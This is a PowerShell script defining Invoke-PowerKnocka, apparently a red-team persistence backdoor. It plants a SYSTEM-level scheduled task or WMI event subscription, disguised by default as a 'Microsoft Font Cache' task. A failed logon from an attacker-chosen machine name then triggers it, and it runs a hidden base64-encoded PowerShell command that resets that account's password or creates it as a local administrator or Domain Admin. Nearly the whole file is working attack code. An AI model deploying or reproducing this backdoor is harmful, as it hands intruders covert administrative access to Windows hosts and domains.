function Invoke-PowerKnocka {
    
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory)]
        [string]$Method,

        [Parameter(Mandatory=$false)]
        [string]$Name = "Microsoft Font Cache",

        [Parameter(Mandatory=$false)]
        [string]$TaskDesription = "Default task to refresh the font cache service",

        [Parameter(Mandatory=$false)]
        [string]$TaskPath = "\Font Cache\",

        [Parameter(Mandatory=$false)]
        [string]$Password = "Password1!qazwsx",

        [Parameter(Mandatory=$false)]
        [switch]$DC,

        [Parameter(Mandatory=$false)]
        [string]$NBName,

        [Parameter(Mandatory=$false)]
        [switch]$SSH,

        [Parameter(Mandatory=$false)]
        [string]$SSHIdentifier = "-"


    )    

    if ($DC) {
        $ExploitString = '$e = Get-EventLog -LogName Security -InstanceId 4625 -Newest 1; $n = $e.ReplacementStrings[5];if ($e.ReplacementStrings[6] -eq "' + $NBName + '") {try{ Set-ADAccountPassword -Identity $n -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "' + $Password + '" -Force)} catch { New-ADUser -Enabled $true -SamAccountName $n -Name $n -Accountpassword (ConvertTo-SecureString "' + $Password + '" -AsPlainText -force);Add-ADGroupMember -Identity "Domain Admins" -Members $n}}'

    }
    else {
        $ExploitString = '$e = Get-EventLog -LogName Security -InstanceId 4625 -Newest 1; $n = $e.ReplacementStrings[5];if ($e.ReplacementStrings[6] -eq "' + $NBName + '") {if (net user $n) {net user $n "' + $Password + '"} else {net user $n "' + $Password + '" /add;net localgroup administrators $n /add}}'
    }

    if ($SSH) {
        $SSHString = '-Enc ((Get-WinEvent -LogName OpenSSH/Operational -MaxEvents 1 | Select -ExpandProperty Message) | %{$_.split(" ")[6]} | %{$_.split("' + $SSHIdentifier + '")[1]} | Get-Unique)'
    }

    $Bytes = [System.Text.Encoding]::Unicode.GetBytes($ExploitString)
    $EncodedExploitString =[Convert]::ToBase64String($Bytes)
    $FinalExploitString = '-WindowStyle Hidden -NoP -NonI -Enc ' + $EncodedExploitString

    if ($Method -eq "Task") {
        $Class = Get-cimclass MSFT_TaskEventTrigger root/Microsoft/Windows/TaskScheduler
        $Trigger = $Class | New-CimInstance -ClientOnly
        $Trigger.Enabled = $true
        $Trigger.Subscription = '<QueryList><Query Id="0" Path="Security"><Select Path="Security">*[System[Provider[@Name="Microsoft-Windows-Security-Auditing"] and EventID=4625]]</Select></Query></QueryList>'
        $Principal = New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\SYSTEM' -LogonType ServiceAccount
        $Settings = New-ScheduledTaskSettingsSet
        $ActionParameters = @{
            Execute  = 'C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe'
            Argument = $FinalExploitString
        }
        $Action = New-ScheduledTaskAction @ActionParameters
        $RegSchTaskParameters = @{
            TaskName    = $Name
            Description = $TaskDescription
            TaskPath    = $TaskPath
            Action      = $Action
            Principal   = $Principal
            Settings    = $Settings
            Trigger     = $Trigger
        }        
        Register-ScheduledTask @RegSchTaskParameters
    } 
    elseif ($Method -eq "WMI") {
        # WMI __EVENTFILTER
        $wmiParams = @{
            ErrorAction = 'Stop'
            NameSpace = 'root\subscription'
        }

        $wmiParams.Class = '__EventFilter'
        $wmiParams.Arguments = @{
            Name = $Name
            EventNamespace = 'root\CIMV2'
            QueryLanguage = 'WQL'
            Query = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND TargetInstance.EventCode = '4625'"
        }
        $filterResult = Set-WmiInstance @wmiParams

        # WMI __EVENTCONSUMER
        $wmiParams.Class = 'CommandLineEventConsumer'
        $wmiParams.Arguments = @{
            Name = $Name
            CommandLineTemplate = "powershell.exe " + $FinalExploitString
        }
        $consumerResult = Set-WmiInstance @wmiParams

        #WMI __FILTERTOCONSUMERBINDING
        $wmiParams.Class = '__FilterToConsumerBinding'
        $wmiParams.Arguments = @{
            Filter = $filterResult
            Consumer = $consumerResult
        }

        Set-WmiInstance @wmiParams
    } 
    else {
        Write-Host "[Error] Invalid Method, exiting" -ForegroundColor Red
        exit
    }
}